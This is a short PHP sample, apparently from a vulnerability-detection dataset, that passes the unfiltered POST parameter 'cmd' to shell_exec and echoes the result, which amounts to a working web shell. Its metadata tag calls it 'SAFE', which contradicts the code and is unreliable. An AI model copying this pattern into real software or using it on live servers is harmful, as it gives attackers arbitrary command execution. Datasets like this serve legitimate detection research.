<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_DIRECT; SKELETON=S2; KEY=cmd; SINK=B3; VAR=v0132 */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$inp = (string)($_POST["cmd"] ?? "");
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B3($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
